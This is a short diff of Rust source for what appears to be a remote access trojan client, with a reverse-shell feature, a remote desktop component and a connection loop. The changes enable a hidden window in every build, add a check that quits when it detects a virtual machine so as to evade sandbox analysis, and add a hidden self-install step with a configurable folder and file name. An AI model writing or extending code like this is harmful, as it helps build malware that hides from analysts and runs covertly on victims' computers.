@@ -1,5 +1,5 @@
-//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
-//#![cfg_attr(debug_assertions, windows_subsystem = "windows")]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+#![cfg_attr(debug_assertions, windows_subsystem = "windows")]
 
 #[no_mangle]
 #[link_section = ".zzz"]
@@ -32,6 +32,12 @@ static REVERSE_SHELL: Lazy<Mutex<features::reverse_shell::ReverseShell>> = Lazy:
 async fn main() {
     let config = service::config::get_config();
 
+    if config.anti_vm_detection {
+        if service::anti_vm::anti_vm_detection() {
+            std::process::exit(0);
+        }
+    }
+
     unsafe {
         // FIX REMOTE DESKTOP DPI ISSUES
         SetProcessDPIAware();
@@ -44,9 +50,9 @@ async fn main() {
     }
 
     if config.install {
-        // INSTALL CLIENT
-        //install_client(); - TODO: Implement -- Note: should check if it was already installed
+        service::install::install(config.install_folder.clone(), config.file_name.clone(), config.enable_hidden);
     }
+
 
     // Main connection loop
     loop {
